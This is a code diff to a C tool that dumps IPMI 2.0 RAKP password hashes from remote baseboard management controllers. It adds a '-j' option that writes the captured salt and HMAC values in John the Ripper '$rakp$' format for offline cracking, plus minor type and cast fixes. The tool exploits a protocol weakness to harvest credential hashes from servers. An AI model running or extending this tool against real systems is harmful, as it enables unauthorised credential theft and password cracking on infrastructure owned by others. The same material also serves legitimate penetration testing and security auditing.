@@ -1,3 +1,4 @@
+#include <ctype.h>
 #include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
@@ -103,12 +104,13 @@ struct globalArgs_t {
 	char *IP;		/* without param */
 	char *Login;		/* -l */
 	int DoPing;		/* -p */
+	char *JohnFilename;     /* -j */
 	int DoDump;		/* -d */
         int DoForce;		/* -f */
 	int VerboseLevel;	/* -v */
 } globalArgs;
 
-static const char *optString = "l:L:v:fpd";
+static const char *optString = "l:L:v:j:fpd";
 
 void RandStr(char *dst, uint32_t length)
 {
@@ -240,6 +242,34 @@ void PrintSaltHash(const char* Username, const char* Salt, const char* Hash)
 
 }
 
+void WriteSaltHashToJohn(const char* Username, const char* Salt, const char* Hash)
+{
+	uint32_t SaltLength = 58 + strlen(Username);
+	int j;
+	FILE *outfile = fopen(globalArgs.JohnFilename, "a");
+
+	if ( !outfile ) 
+	{
+		fprintf(stderr, "[-] Unable to write to file: %s!\n", globalArgs.JohnFilename);
+		return;
+	}
+
+	fprintf(outfile, "%s:$rakp$", Username);
+
+	for (j = 0; j < SaltLength; j++)
+		fprintf(outfile, "%02x", (uint8_t) Salt[j]);
+
+	fprintf(outfile, "$");
+
+	for (j = 0; j < 20; j++)
+		fprintf(outfile, "%02x", (uint8_t) Hash[j]);
+
+	fprintf(outfile, "\n");
+
+	fclose(outfile);
+
+}
+
 void ToBanner(ChannelAuthReply *info)
 {
 	if ( info->ipmi_compat_20 == 1)
@@ -331,7 +361,7 @@ void PrintChannel(ChannelAuthReply *info)
 
 int PingIPMI(const char *Target)
 {
-	int fromlen = 512;
+	socklen_t fromlen = 512;
 	int k, get, send;
 	ChannelAuthReply *packet;
 	uint8_t vect[512] = {0};
@@ -421,7 +451,7 @@ void DumpHash(const char* Username, const char* Target)
 	timeout.tv_usec = 0;
 
 
-	int fromlen = 512;
+	socklen_t fromlen = 512;
 
 	if ( globalArgs.VerboseLevel >= 2 )
 		printf("[i] Trying username %s\n", Username);
@@ -459,15 +489,15 @@ void DumpHash(const char* Username, const char* Target)
 		if ( globalArgs.VerboseLevel >= 3 )
 		{ 
 			printf("SessID\n");
-			printhex(ConsoleSessionID,	SIZE_CONSOLE_SESSION_ID);
+			printhex((unsigned char*)ConsoleSessionID,	SIZE_CONSOLE_SESSION_ID);
 			printf("\n");
 
 			printf("RandID\n");
-			printhex(ConsoleRandomID,	SIZE_CONSOLE_RANDOM_ID);
+			printhex((unsigned char*)ConsoleRandomID,	SIZE_CONSOLE_RANDOM_ID);
 			printf("\n");
 
 			printf("Packet CreateIPMISessionOpenRequest\n");
-			printhex(send_udp,		SIZE_SESSION_OPEN_REQUEST);
+			printhex((unsigned char*)send_udp,		SIZE_SESSION_OPEN_REQUEST);
 			printf("\n");
 		}
 
@@ -511,15 +541,15 @@ void DumpHash(const char* Username, const char* Target)
 		if ( globalArgs.VerboseLevel >= 3 )
 		{
 			printf("Got packet from IPMI\n");
-			printhex(recv_udp, get);
+			printhex((unsigned char*)recv_udp, get);
 			printf("\n");
 
 			printf("BMCSessionID\n");
-			printhex(BMCSessionID, 4);
+			printhex((unsigned char*)BMCSessionID, 4);
 			printf("\n");
 
 			printf("RAKP1 message\n");
-			printhex(send_udp, 44 + strlen(Username));
+			printhex((unsigned char*)send_udp, 44 + strlen(Username));
 			printf("\n");
 		}
 
@@ -550,7 +580,7 @@ void DumpHash(const char* Username, const char* Target)
 		if ( globalArgs.VerboseLevel >= 3 )
 		{
 			printf("recv RAKP2 message\n");
-			printhex(recv_udp, get);
+			printhex((unsigned char *)recv_udp, get);
 			printf("\n");
 		}
 
@@ -619,7 +649,8 @@ void DumpHash(const char* Username, const char* Target)
 	);
 
 	PrintSaltHash(Username, Salt, Hash);
-
+	if ( globalArgs.JohnFilename )
+		WriteSaltHashToJohn(Username, Salt, Hash);
 }
 
 void Usage(const char* ProgramName)
@@ -628,6 +659,7 @@ void Usage(const char* ProgramName)
 	printf("        -l  Login /*not impl*/  Dump hash for login\n");
 	printf("        -L  File  /*not impl*/  File with logins\n");
 	printf("        -d                      Dump hashes\n");
+	printf("        -j  File                Write hashes in John the Ripper format (implies -d)\n");
 	printf("        -p                      Ping IPMI\n");
 	printf("        -f                      Try dump hashes from all targets\n");
 	printf("        -v  1|2|3 (default 0)   Verbose level\n");
@@ -644,6 +676,7 @@ int main(int argc, const char **argv)
 	globalArgs.IP		= NULL;
 	globalArgs.Login	= NULL;
 	globalArgs.DoPing	= 0;
+	globalArgs.JohnFilename = NULL;
 	globalArgs.DoDump	= 0;
 	globalArgs.DoForce	= 0;
 	globalArgs.VerboseLevel	= 0;
@@ -659,6 +692,9 @@ int main(int argc, const char **argv)
 			case 'L':
 				globalArgs.LoginFile = optarg;
 				break;
+			case 'j':
+				globalArgs.JohnFilename = optarg;
+				// Intentional fallthrough
 			case 'd':
 				globalArgs.DoDump = 1;
 				break;
@@ -775,7 +811,7 @@ int main(int argc, const char **argv)
 	}
 #endif
 
-	int i,k,j;
+	int i,k;
 
 	for (i = 0; i < count_hosts; i++)
 	{
